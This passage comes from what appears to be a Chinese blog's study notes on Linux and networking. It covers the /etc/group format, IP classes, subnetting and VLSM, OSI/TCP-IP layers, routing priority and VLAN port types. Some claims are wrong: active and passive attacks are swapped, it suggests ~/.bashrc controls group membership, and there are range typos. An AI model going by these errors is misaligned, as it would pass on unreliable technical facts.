id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">root@kylin-vmwarevirtualplatform:~# cat /etc/group</span><br><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog,kylin</span><br><span class="line">tty:x:5:</span><br><span class="line">disk:x:6:</span><br><span class="line">lp:x:7:</span><br><span class="line">mail:x:8:</span><br><span class="line">news:x:9:</span><br><span class="line">uucp:x:10:</span><br><span class="line">man:x:12:</span><br><span class="line">proxy:x:13:</span><br><span class="line">kmem:x:15:</span><br><span class="line">dialout:x:20:</span><br><span class="line">fax:x:21:</span><br><span class="line">voice:x:22:</span><br><span class="line">cdrom:x:24:kylin</span><br><span class="line">floppy:x:25:</span><br><span class="line">tape:x:26:</span><br><span class="line">sudo:x:27:kylin</span><br><span class="line">audio:x:29:pulse,root,kylin</span><br><span class="line">dip:x:30:kylin</span><br><span class="line">www-data:x:33:</span><br><span class="line">backup:x:34:</span><br><span class="line">operator:x:37:</span><br><span class="line">list:x:38:</span><br><span class="line">irc:x:39:</span><br><span class="line">src:x:40:</span><br><span class="line">gnats:x:41:</span><br><span class="line">shadow:x:42:</span><br><span class="line">utmp:x:43:</span><br><span class="line">video:x:44:</span><br><span class="line">sasl:x:45:</span><br><span class="line">plugdev:x:46:kylin</span><br><span class="line">staff:x:50:</span><br><span class="line">games:x:60:</span><br><span class="line">users:x:100:</span><br><span class="line">nogroup:x:65534:</span><br><span class="line">messagebus:x:101:</span><br><span class="line">systemd-timesync:x:102:</span><br><span class="line">systemd-journal:x:103:</span><br><span class="line">systemd-network:x:104:</span><br><span class="line">systemd-resolve:x:105:</span><br><span class="line">systemd-coredump:x:106:</span><br><span class="line">crontab:x:107:</span><br><span class="line">input:x:108:</span><br><span class="line">kvm:x:109:</span><br><span class="line">render:x:110:</span><br><span class="line">syslog:x:111:</span><br><span class="line">bluetooth:x:112:</span><br><span class="line">ssl-cert:x:113:</span><br><span class="line">netdev:x:114:</span><br><span class="line">avahi-autoipd:x:115:</span><br><span class="line">ssh:x:116:</span><br><span class="line">i2c:x:117:</span><br><span class="line">lpadmin:x:118:kylin</span><br><span class="line">lightdm:x:119:</span><br><span class="line">nopasswdlogin:x:120:</span><br><span class="line">xrdp:x:121:</span><br><span class="line">avahi:x:122:</span><br><span class="line">scanner:x:123:saned</span><br><span class="line">pulse:x:124:</span><br><span class="line">pulse-access:x:125:</span><br><span class="line">saned:x:126:</span><br><span class="line">colord:x:127:</span><br><span class="line">nvidia-persistenced:x:128:</span><br><span class="line">sambashare:x:129:kylin</span><br><span class="line">geoclue:x:130:</span><br><span class="line">uuidd:x:131:</span><br><span class="line">kylin:x:1000:</span><br><span class="line">mysql:x:132:</span><br></pre></td></tr></table></figure><p><code>/etc/group</code> 文件是一个系统级别的配置文件，它包含了系统中所有组的信息。每个用户都可以属于一个或多个组，组是一种将用户分组的机制，这有助于管理文件和目录的访问权限。</p><p><code>/etc/group</code> 文件中的每一行都描述了一个组，其中包含以下列：</p><ol><li><p>组名：组的名称，用于标识该组。</p></li><li><p>组密码：组密码用于限制对组的访问。在大多数情况下，组密码为空，这意味着任何人都可以加入该组。</p></li><li><p>GID：组ID（GID）是一个数字，用于唯一标识该组。</p></li><li><p>组成员：该组中的用户列表，用逗号分隔。</p></li></ol><p>以下是一个示例 <code>/etc/group</code> 文件的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog,john</span><br><span class="line">john:x:1000:</span><br><span class="line">users:x:1001:john,mary</span><br></pre></td></tr></table></figure><p>在上面的示例中，有7个组：</p><ul><li><p><code>root</code> 组，GID 为 0，只有 root 用户属于该组。</p></li><li><p><code>daemon</code> 组，GID 为 1，只有系统守护进程属于该组。</p></li><li><p><code>bin</code> 组，GID 为 2，只有二进制文件所有者属于该组。</p></li><li><p><code>sys</code> 组，GID 为 3，只有系统管理员属于该组。</p></li><li><p><code>adm</code> 组，GID 为 4，该组有两个成员 <code>syslog</code> 和 <code>john</code>。</p></li><li><p><code>john</code> 组，GID 为 1000，只有 <code>john</code> 用户属于该组。</p></li><li><p><code>users</code> 组，GID 为 1001，该组有两个成员 <code>john</code> 和 <code>mary</code>。</p></li></ul><p>请注意，<code>/etc/group</code> 文件是一个系统级别的配置文件，只有管理员才有权限修改它。如果您需要对个人用户进行特定的组分配更改，应该使用 <code>usermod</code> 命令或编辑用户的个人配置文件（例如 <code>~/.bashrc</code> 或 <code>~/.bash_profile</code>）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IP</title>
      <link href="/2023/08/31/IP/"/>
      <url>/2023/08/31/IP/</url>
      
        <content type="html"><![CDATA[<h1 id="IP分类"><a href="#IP分类" class="headerlink" title="IP分类"></a>IP分类</h1><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202308011009650.png"></p><p>A类——网络号占1个字节，网络号的第一位固定为0</p><p>(1.0.0.0-126.0.0.0)（默认子网掩码：255.0.0.0或/8或 0xFF000000）</p><p>0*******       ********     ********     ********</p><p>1—126 0—255 0—255 1—254</p><p><strong>没有0.0.0.0是因为他是缺省地址，它代表了所有地址</strong></p><p><strong>（127去哪了？—回环网段，用来做测试，能ping通说明网卡协议没问题。）</strong></p><p>B类——网络号占2个字节，网络号的前两位固定为10</p><p>(128.0.0.0-191.255.0.0)（默认子网掩码：255.255.0.0或/16或0xFFFF0000）</p><p>10******         ********      ********      ********</p><p>128—191 0—255 0—255 1—254</p><p>C类——网络号占3个字节，网络号的前三位固定位110</p><p>(192.0.0.0-223.255.255.0)（子网掩码：255.255.255.0或/24或 0xFFFFFF00）</p><p>110*****          ********     ********      ********</p><p>192—233 0—255 0—255 1—254</p><p>D类——前四位是1110，用于多播(multicast)，即一对多通信</p><p>是多播地址。该类IP地址的最前面为“1110”，所以地址的网络号取值于224~239之间。一般用于多路广播用户。</p><p>E类——前四位是1111，保留为以后使用</p><p>是保留地址。该类IP地址的最前面为“1111”，所以地址的网络号取值于240~255之间。</p><p><strong>其中，ABC三类地址为单播地址（unicast),用于一对一通信，是最常用的。</strong></p><h1 id="IP地址类型"><a href="#IP地址类型" class="headerlink" title="IP地址类型"></a>IP地址类型</h1><h2 id="私有地址范围"><a href="#私有地址范围" class="headerlink" title="私有地址范围"></a>私有地址范围</h2><p>10.0.0.0-10.255.255.255</p><p>172.16.0.0-172.31.255.255</p><p>192.168.0.0-192.168.255.255</p><p>私有地址之外的IP是公有地址</p><h2 id="特殊地址"><a href="#特殊地址" class="headerlink" title="特殊地址"></a>特殊地址</h2><p>0.0.0.0：缺省地址，代表所有地址。</p><p>127.0.0.0-127.255.255.255：在这个网段即网络号为127的任意ip地址。都是内部主机回环地址(loopback)，永远都不能出现在主机外部的网络中。</p><p>255.255.255.255：广播地址，发送给它的数据会被转发给所有IP。</p><h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h1><p>子网掩码是用来指明某一个ip地址的的哪些位标识的是主机所在的子网,哪些位标识是主机的位掩码。</p><p>通过IP地址和子网掩码的二进制<strong>与运算</strong>，可以得出主机的网络位和主机位。</p><p>如下，192.168.1.0和255.255.255.0（/24）相与</p><p>IP地址       1100 0000 1010 1000 0000 0001 0000 0000</p><p>子网掩码   1111 1111 1111 1111 1111 1111 0000 0000 </p><p>二者相与   1111 1111 1111 1111 1111 1111 0000 0000</p><p>可知，前24位是网络位，即192.168.1，后8位为主机位，即.0</p><p>它的表示方法如下两种：</p><p>1、192.168.1.n/24                                            /24表示子网掩码二进制标识法中的前24位为1</p><p>2、192.168.1.n       255.255.255.0</p><p>常用的子网掩码有255.255.0.0(/16)、255.255.255.0(/24)</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>192.168.1.1/26                                   192.168.1.129/30</p><p>1100 0000 1010 1000 0000 0001 0000 0001    192.168.1.1</p><p>1111 1111 1111 1111 1111 1111 1100 0000      /26</p><p>1100 0000 1010 1000 0000 0001 0000 0000     192.168.1.0（网络位）</p><p>1100 0000 1010 1000 0000 0001 1000 0001     192.168.1.129</p><p>1111 1111 1111 1111 1111 1111 1111 1100      /30</p><p>1100 0000 1010 1000 0000 0001 1000 0000      192.168.1.128（网络位）</p><p>网络位+主机位=32</p><p>1、192.168.1.1/26  </p><p>主机位=32-26=6     2^6=64个地址    192.168.1.0-192.168.1.63</p><p>由于192.168.1.0 网段</p><p><strong>一般使用网段的第一个或最后一个可用地址作为网关</strong></p><p>192.168.1.63 作为广播地址</p><p>可用地址数=64-2=62</p><p>可用的地址范围192.168.1.1-62</p><p>2、192.168.1.129/30=2</p><p>主机位=32-30</p><p>3、192.168.1.0/24 网络位：24位  主机位：32-24=8位</p><p>网络位：192.168.1.0</p><p>主机位：2^8=256个地址</p><p>主机位可用地址：256-2=254个</p><p>假如有35台电脑，就需要35个终端地址和1个网关地址，共36个地址</p><p>此时因为有256个地址可用，有点浪费，仅需要6个主机位，2^6=64个地址即可。</p><p>网络位=32-6=26       仅需要192.168.1.0/26</p><p>1100 0000 1010 1000 0000 0001 0000 0000     192.168.1.0</p><p>1111 1111 1111 1111 1111 1111 1100 0000       /26</p><p>网络位：192.168.1.0   </p><p>可用地址：192.168.1.1-62</p><h1 id="可变长子网掩码"><a href="#可变长子网掩码" class="headerlink" title="可变长子网掩码"></a>可变长子网掩码</h1><p><strong>可变长子网掩码</strong>（Variable Length Subnet Mask，可变长度子网掩码）：规定了如何在一个进行了子网划分的网络中的不同部分使用不同的子网掩码。</p><p>VLSM就是在类的IP地址的基础上，从它们的主机号部分借出相应的位数来做网络号，也就是增加网络号的位数。</p><p>VLSM合理划分网段，节省IP地址。</p><p>现有一个C类网络地址段 192.168.1.0/24，使用变长子网掩码给下列三个子网分配IP地址</p><p>财务终端数：30，业务终端数：10，总裁组终端数：2</p><p>2^5=32   财务网络位=32-5=27    192.168.1.0/27      1.0-1.31     可用地址：1.1-1.30   需要分配30+1个地址</p><p>2^4=16   业务网络位=32-4=28    192.168.1.32/28    1.32-1.47   可用地址：1.33-1.46   需要分配10+1个地址 </p><p>2^2=4 总裁组网络位=32-2=30     192.168.1.48/30    1.48-1.51   可用地址：1.49-1.50   需要分配2+1个地址</p><p>（需要分配地址+1是因为需要网关来实现不同网段的通信）</p><p><strong>有类IP</strong></p><p>有类(主类)IP地址:主要分为A、B、C类,每种类型固定的掩码。 无类IP地址:无论哪种类型的IP地址都没有固定掩码。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络基础</title>
      <link href="/2023/08/28/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/08/28/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="网络认知"><a href="#网络认知" class="headerlink" title="网络认知"></a>网络认知</h1><h2 id="网络架构-amp-解决方案"><a href="#网络架构-amp-解决方案" class="headerlink" title="网络架构&amp;解决方案"></a>网络架构&amp;解决方案</h2><p>1.网络架构&amp;解决方案概述：了解传统网络架构及现阶段网络安全在传统网络架构中的<br>位置</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>配置优化和冗余解决方案来提升网络性能 </p><p>网络架构分层（接入层、汇聚层、核心层）是为了快速排查问题。</p><p>接入层：同一局域网中心</p><p>汇聚层：不同局域网中心</p><p>核心层：确保安全的同时保证网络中的所有/部分人员访问外网</p><p>现阶段网络中最重要的因素：</p><p>1、优化。保证网络中的路径最优。</p><p>2、确保网络可靠性，避免单点故障带来问题。</p><p>3、网络安全。</p><p>4、统一管理、运维。</p><p>5、展望未来。下一代网络到云上。</p><h2 id="网络模型-amp-网络安全"><a href="#网络模型-amp-网络安全" class="headerlink" title="网络模型&amp;网络安全"></a>网络模型&amp;网络安全</h2><p>2.网络模型&amp;网络安全: 掌传统OSI、TCPVP模型与网络安全之间的关系</p><h3 id="OSI-amp-TCP-IP协议基础"><a href="#OSI-amp-TCP-IP协议基础" class="headerlink" title="OSI&amp;TCP/IP协议基础"></a>OSI&amp;TCP/IP协议基础</h3><h4 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h4><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202308281102245.png"></p><p>上三层：</p><p>7、应用层：提供应用程序</p><p>6、表示层：处理数据格式、数据加密等</p><p>5、会话层：建立、维护和管理会话</p><p>下四层：主要是寻址和转发</p><p>4、传输层：建立主机端到端连接</p><p>3、网络层：寻址和路由选择</p><p>2、数据链路层：提供介质访问、链路管理等</p><p>1、物理层：比特流传输</p><p>每一层利用下一层提供的服务与对等层（如HOST A的网络层利用数据链路层提供的服务与HOST B的网络层通信）通信。</p><h4 id="网络数据流处理流程"><a href="#网络数据流处理流程" class="headerlink" title="网络数据流处理流程"></a>网络数据流处理流程</h4><div align = "center">网络数据流处理流程</div><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\网络数据流处理流程.png)</p><p>拆封装到网络层（<strong>寻址和路由选择</strong>），知道目的地址，就可以下一步传递。</p><h4 id="TCP-IP和OSI的对应关系"><a href="#TCP-IP和OSI的对应关系" class="headerlink" title="TCP/IP和OSI的对应关系"></a>TCP/IP和OSI的对应关系</h4><p>TCP/IP协议栈具有简单的分层设计，与OSI模型有清晰的对应关系</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\OSI对应TCPIP.png)</p><h4 id="TCP-IP协议栈封装解封装过程"><a href="#TCP-IP协议栈封装解封装过程" class="headerlink" title="TCP/IP协议栈封装解封装过程"></a>TCP/IP协议栈封装解封装过程</h4><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\TCPIP封装解封装.png)</p><h4 id="TCP-IP协议栈各层作用"><a href="#TCP-IP协议栈各层作用" class="headerlink" title="TCP/IP协议栈各层作用"></a>TCP/IP协议栈各层作用</h4><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\TCPIP协议栈各层作用.png)</p><p>传输层以上的协议有端口号，以下无端口号。例如HTTP-80，Telnet-23，FTP-20（传输数据）-21（传输控制信息）</p><p>TCP面向连接，可靠可控。UDP无面向连接，不可靠不可控。TCP连接需要三次握手，四次挥手，UDP单方面建立连接。</p><h4 id="TCP三次握手，四次挥手"><a href="#TCP三次握手，四次挥手" class="headerlink" title="TCP三次握手，四次挥手"></a>TCP三次握手，四次挥手</h4><h3 id="TCP-IP协议安全"><a href="#TCP-IP协议安全" class="headerlink" title="TCP/IP协议安全"></a>TCP/IP协议安全</h3><h4 id="IPV4安全隐患"><a href="#IPV4安全隐患" class="headerlink" title="IPV4安全隐患"></a>IPV4安全隐患</h4><p>1、缺乏数据源验证机制</p><p>2、缺乏完整性验证机制</p><p>3、缺乏机密性保障机制</p><h4 id="TCP-IP协议栈常见安全风险"><a href="#TCP-IP协议栈常见安全风险" class="headerlink" title="TCP/IP协议栈常见安全风险"></a>TCP/IP协议栈常见安全风险</h4><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\TCPIP协议栈常见安全风险.png)</p><h3 id="常见网络攻击方式"><a href="#常见网络攻击方式" class="headerlink" title="常见网络攻击方式"></a>常见网络攻击方式</h3><p>主动攻击和被动攻击。</p><p>主动攻击：窃取信息</p><p>被动攻击：拒绝服务、假冒攻击（假冒部分+数据载荷）、篡改攻击（报文首部+篡改内容）</p><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><h2 id="网络编址"><a href="#网络编址" class="headerlink" title="网络编址"></a>网络编址</h2><h3 id="IP基础"><a href="#IP基础" class="headerlink" title="IP基础"></a>IP基础</h3><p>1、IP地址由32个二进制组成，通常用点分十进制形式表示。</p><p>2、IP地址分为网络部分和主机部分。</p><p>例如，192.168.1.1</p><table><thead><tr><th>进制</th><th>网络位</th><th>主机位</th></tr></thead><tbody><tr><td>十进制</td><td>192.168.1</td><td>.1</td></tr><tr><td>二进制</td><td>11000000.10101000.00000001</td><td>.00000001</td></tr></tbody></table><p>192.168.1.0是第一个地址，代表网段（主机位二进制全为0，十进制为0），不能使用</p><table><thead><tr><th>网络位</th><th>主机位</th></tr></thead><tbody><tr><td>192.168.1</td><td>.0</td></tr><tr><td>11000000.10101000.00000001</td><td>.0000000</td></tr></tbody></table><p>192.168.1.255是最后一个地址，作为广播地址（主机位二进制全为1，十进制为255），不能使用</p><table><thead><tr><th>网络位</th><th>主机位</th></tr></thead><tbody><tr><td>192.168.1</td><td>.255</td></tr><tr><td>11000000.10101000.00000001</td><td>.11111111</td></tr></tbody></table><p>192.168.1.253作为网关，不可使用。</p><table><thead><tr><th>网络位</th><th>主机位</th></tr></thead><tbody><tr><td>192.168.1</td><td>.253</td></tr><tr><td>11000000.10101000.00000001</td><td>.11111101</td></tr></tbody></table><p>网关的作用是转发来自不同网段之间的数据包。</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\网关.png)</p><p>同一局域网通信，二层通信（数据链路层通信）时不用网关，三层通信（网络层通信）时必须使用网关。</p><p>同一网段通信(网络位相同)不需要依靠网关转发，<strong>不同网段通信必须依靠网关转发</strong>。 </p><p>IP详细介绍见<a href="https://s1gma0.github.io/2023/08/31/IP/">https://s1gma0.github.io/2023/08/31/IP/</a></p><h3 id="子网划分-amp-掩码聚合"><a href="#子网划分-amp-掩码聚合" class="headerlink" title="子网划分&amp;掩码聚合"></a>子网划分&amp;掩码聚合</h3><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\地址划分.png)</p><p><strong>子网掩码</strong>是用来指明某一个ip地址的的哪些位标识的是主机所在的子网,哪些位标识是主机的位掩码。</p><p>通过IP地址和子网掩码的二进制<strong>与运算</strong>，可以得出主机的网络位和主机位。</p><p>如下，192.168.1.0和255.255.255.0（/24）相与</p><p>IP地址       1100 0000 1010 1000 0000 0001 0000 0000</p><p>子网掩码   1111 1111 1111 1111 1111 1111 0000 0000 </p><p>二者相与   1111 1111 1111 1111 1111 1111 0000 0000</p><p>可知，前24位是网络位，即192.168.1，后8位为主机位，即.0</p><p>它的表示方法如下两种：</p><p>1、192.168.1.n/24                                            /24表示子网掩码二进制标识法中的前24位为1</p><p>2、192.168.1.n       255.255.255.0</p><p>常用的子网掩码有255.255.0.0(/16)、255.255.255.0(/24)</p><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><p>192.168.1.1/26                                   192.168.1.129/30</p><p>1100 0000 1010 1000 0000 0001 0000 0001    192.168.1.1</p><p>1111 1111 1111 1111 1111 1111 1100 0000      /26</p><p>1100 0000 1010 1000 0000 0001 0000 0000     192.168.1.0（网络位）</p><p>1100 0000 1010 1000 0000 0001 1000 0001     192.168.1.129</p><p>1111 1111 1111 1111 1111 1111 1111 1100      /30</p><p>1100 0000 1010 1000 0000 0001 1000 0000      192.168.1.128（网络位）</p><p>网络位+主机位=32</p><p>1、192.168.1.1/26  </p><p>主机位=32-26=6     2^6=64个地址    192.168.1.0-192.168.1.63</p><p>由于192.168.1.0 网段</p><p><strong>一般使用网段的第一个或最后一个可用地址作为网关</strong></p><p>192.168.1.63 作为广播地址</p><p>可用地址数=64-2=62</p><p>可用的地址范围192.168.1.1-62</p><p>2、192.168.1.129/30=2</p><p>主机位=32-30</p><p>3、192.168.1.0/24 网络位：24位  主机位：32-24=8位</p><p>网络位：192.168.1.0</p><p>主机位：2^8=256个地址</p><p>主机位可用地址：256-2=254个</p><p>假如有35台电脑，就需要35个终端地址和1个网关地址，共36个地址</p><p>此时因为有256个地址可用，有点浪费，仅需要6个主机位，2^6=64个地址即可。</p><p>网络位=32-6=26       仅需要192.168.1.0/26</p><p>1100 0000 1010 1000 0000 0001 0000 0000     192.168.1.0</p><p>1111 1111 1111 1111 1111 1111 1100 0000       /26</p><p>网络位：192.168.1.0   </p><p>可用地址：192.168.1.1-62</p><h4 id="可变长子网掩码"><a href="#可变长子网掩码" class="headerlink" title="可变长子网掩码"></a>可变长子网掩码</h4><p><strong>可变长子网掩码</strong>（Variable Length Subnet Mask，可变长度子网掩码）：规定了如何在一个进行了子网划分的网络中的不同部分使用不同的子网掩码。</p><p>VLSM就是在类的IP地址的基础上，从它们的主机号部分借出相应的位数来做网络号，也就是增加网络号的位数。</p><p>VLSM合理划分网段，节省IP地址。</p><p>现有一个C类网络地址段 192.168.1.0/24，使用变长子网掩码给下列三个子网分配IP地址</p><p>财务终端数：30，业务终端数：10，总裁组终端数：2</p><p>2^5=32   财务网络位=32-5=27    192.168.1.0/27      1.0-1.31     可用地址：1.1-1.30   需要分配30+1个地址</p><p>2^4=16   业务网络位=32-4=28    192.168.1.32/28    1.32-1.47   可用地址：1.33-1.46   需要分配10+1个地址 </p><p>2^2=4 总裁组网络位=32-2=30     192.168.1.48/30    1.48-1.51   可用地址：1.49-1.50   需要分配2+1个地址</p><p>（需要分配地址+1是因为需要网关来实现不同网段的通信）</p><h4 id="掩码聚合"><a href="#掩码聚合" class="headerlink" title="掩码聚合"></a>掩码聚合</h4><p><strong>无类别域间路由</strong></p><p>无类域间路由CIDR (Classless nter Domain Routing) 由RFC1817定义，CIDR突破了传统IP地址的分类边界，将路由表中的若干条路由汇聚为、条路由，减少了路由表的规模，提高了路由器的可扩展性。</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\无类别域间路由.png)</p><p>如上图示，一个企业分配到了一段A类网地址，10.24.0.0/22。该企业准备这些A类网络分治各个用户群，目前已经分配了四个网段给用户，如果没有实施CIDR技术，企业路由器的路由表中会有四条下连网段的路由条目，并且会把它通告给其他路由器，通过实施CIDR技术，我们可以在企业的路由器上将淡四条路由10.24.0.0/24，10.24.1.0/24，10.24.2.0/24，10.24.3.0/24汇聚成一条路由10.24,0.0/22这样，企业路由器只需通告10.24..0/22这一条路由大大减小了路由表的规模。</p><p>聚合的时候，完全相同的留下，不同的舍去。偶聚奇不聚（奇数的时候不能聚合）。</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\掩码聚合.png)</p><p>0.0 1.0 2.0 的二进制形式缺少11形式，不能三个一起聚合。因此只能0.0，1.0聚合。</p><h2 id="网络路由基础"><a href="#网络路由基础" class="headerlink" title="网络路由基础"></a>网络路由基础</h2><h3 id="路由器认知"><a href="#路由器认知" class="headerlink" title="路由器认知"></a>路由器认知</h3><p>自治系统（AS）：由同一个机构管理、使用统一路由策略的路由器的集合。</p><p>路由选路：路由器负责为数据包选择一条最优路径，并进行转发。</p><p>路由器转发数据包时，需要知道<strong>下一跳</strong>和<strong>出接口</strong>才能将数据转发出去。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202309181227096.png"></p><h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><p>路由表中包含了路由器可以到达的目的网络，目的网络在路由表中不存在的数据包会被丢弃。</p><p>路由表中的路由有三种来源：直连路由、静态路由、动态路由。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202309181228085.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202309181222837.png"></p><p>路由器选择最优路由的顺序：最长掩码匹配————–路由优先级—————–cost开销10^8除以带宽值</p><p><strong>最长掩码匹配规则</strong>：路由表中有多个匹配目的网络的路由条目，则路由器会选择<strong>掩码最长</strong>的条码。下图中就会选择第二条。</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\最长掩码匹配规则.png)</p><p><strong>路由优先级</strong>：每一个路由协议都有协议优先级（<strong>数值越小，优先级越高</strong>），当有多个路由信息时，选择是最高优先级的路由作为最佳路由。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202309181224472.png"></p><table><thead><tr><th>路由类型</th><th>Direct</th><th>OSPF</th><th>Static</th><th>RIP</th></tr></thead><tbody><tr><td>优先级</td><td>0</td><td>10</td><td>60</td><td>100</td></tr></tbody></table><p><strong>路由度量</strong>（路由开销cost）：对于相同路由类型（协议），当到达某个目标网段有多条路由供选择时，此时路由器会优先选cost值较小的链路，开销数字越小越优先。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202309181225136.png"></p><h2 id="静态路由基础"><a href="#静态路由基础" class="headerlink" title="静态路由基础"></a>静态路由基础</h2><p>静态路由认知</p><p>静态路由是指由管理员手动配置和维护的路由</p><p>在广播型的接口（如以太网接口）上配置静态路由时，必须指定</p><p>下一跳地址</p><p>负载分担&amp;路由备份</p><p>浮动静态路由再网络中主路由失效的情况下，会加入到路由表并承担数据转发业务。</p><p>在主链路正常的情况下，只有主路由会出现在路由表中；在主链路出现故障时，浮动静态路由会被激活并加入到路由表中，承担数据转发业务。</p><p>缺省路由</p><p>缺省路由是目的地址和掩码为全0的特殊路由     0.0.0.0/0      </p><p>如果报文的目的地址无法匹配路由表中的任何一项，路由器将选择依照缺省路由来转发报文。</p><h2 id="VLAN间路由"><a href="#VLAN间路由" class="headerlink" title="VLAN间路由"></a>VLAN间路由</h2><p>VLAN在分割广播域的同时也限制了不同VLAN间的主机进行二层通信的能力。</p><p>VLAN路由-三层交换机为每个VLAN创建一个VLANIF接口作为网关</p><h1 id="交换"><a href="#交换" class="headerlink" title="交换"></a>交换</h1><h2 id="VLAN原理和配置"><a href="#VLAN原理和配置" class="headerlink" title="VLAN原理和配置"></a>VLAN原理和配置</h2><h3 id="VLAN的起源"><a href="#VLAN的起源" class="headerlink" title="VLAN的起源"></a>VLAN的起源</h3><p>在传统局域网中，随着主机数量的增加，共享网络中的冲突会越来越严重，交换网络中的广播也会越来越多。</p><p>VLAN能够隔离广播域。</p><h3 id="VLAN的帧格式"><a href="#VLAN的帧格式" class="headerlink" title="VLAN的帧格式"></a>VLAN的帧格式</h3><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\VLAN帧格式.png)</p><p><strong>通过tag区分不同VLAN</strong></p><p>VLAN标签长4个字节，直接添加在以太网帧头中，IEEE802.1Q文档对VLAN标签作出了说明。<br>TPID: Tag Protocol Identifier.2字节，固定取值，0x8100，是IEEE定义的新类型，表明这是一个携带802.1Q标签的帧。如果不支持802.1Q的设备收到这样的帧，会将其丢弃。</p><h3 id="常见链路类型"><a href="#常见链路类型" class="headerlink" title="常见链路类型"></a>常见链路类型</h3><p>用户主机和交换机之间的链路为接入链路（Access），交换机与交换机之间的链路为干道链路（Trunk）。</p><h4 id="PVID"><a href="#PVID" class="headerlink" title="PVID"></a>PVID</h4><p>PVID表示端口在缺省情况下所属的VLAN</p><p>PVID的作用是<strong>防止交换机把收到的一个裸帧（没有tag的帧，无VLAN ID）直接丢弃</strong></p><p>缺省情况下，X7系列交换机每个端口的PVID都是1.</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\PVID.png)</p><h4 id="端口类型-Access"><a href="#端口类型-Access" class="headerlink" title="端口类型-Access"></a>端口类型-Access</h4><p>1、Access端口在收到数据后会添加VLAN Tag，VLAN ID和端口的PVID相同</p><p>2、Access端口在转发数据前会移除VLAN Tag</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\Access.png)</p><h4 id="端口类型-Trunk"><a href="#端口类型-Trunk" class="headerlink" title="端口类型-Trunk"></a>端口类型-Trunk</h4><p>Trunk允许多个不同VLAN同时通过</p><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\Trunk.png)</p><p>1、当Trunk端口收到帧时，如果该帧不包含Tag，将添加上端口的PVID；如果该帧包含Tag，则不改变</p><p>2、当Trunk端口发送帧时，该的VLANID在Trunk的允许发送列表中；若与端口的PVID相同时，则剥离Tag发送；若与端口的PVID不同时，则直接发送</p><h3 id="VLAN的配置"><a href="#VLAN的配置" class="headerlink" 